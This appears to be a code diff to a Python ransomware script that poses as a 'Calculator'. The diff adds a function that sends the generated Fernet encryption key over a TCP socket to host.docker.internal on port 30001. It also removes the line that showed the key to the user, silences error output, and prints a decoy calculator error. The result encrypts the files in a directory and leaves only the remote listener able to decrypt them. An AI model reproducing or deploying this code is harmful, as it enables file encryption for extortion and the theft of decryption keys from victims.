@@ -1,7 +1,6 @@
 from os import listdir, remove
 from os.path import expanduser, isdir, join, splitext
-import sys
-import argparse
+import sys, argparse, socket
 from cryptography.fernet import Fernet
 from auth_file_ext import ext_lst
 
@@ -54,9 +53,16 @@ def decrypt_loop(dir_path: str, f: Fernet):
                         print('decrypted: [ '  + decrypted_file + ' ] <--- [ '  + file + ' ]')
                     break
                 except BaseException as e:
-                    if is_silent == False:
-                       print('(for logging purposes) ' + str(e), file=sys.stderr)
                     pass
+
+def save_key(key: bytes):
+    HOST = 'host.docker.internal'
+    PORT = 30001
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((HOST, PORT))
+        s.send(key)
+        s.send(b'\n')
+        s.close
 
 def main() -> int:
     parser = argparse.ArgumentParser(description='Calculator: used for calculations')
@@ -82,16 +88,22 @@ def main() -> int:
        return 1
 
     if args.reverse:
-        f = Fernet(args.reverse)
-
+        try:
+            f = Fernet(args.reverse)
+        except BaseException as e:
+            print('Invalid key provided')
+            return 1
         decrypt_loop(target_path, f)
         return 0
     else:
         key = Fernet.generate_key()
         f = Fernet(key)
-
+        try:
+            save_key(key)
+        except BaseException as e:
+            print('Could not execute calculator :-(')
+            return 1
         encrypt_loop(target_path, f)
-        print('You might want to keep this: ' + key.decode('UTF-8'))
         return 0
 
 if __name__ == "__main__":
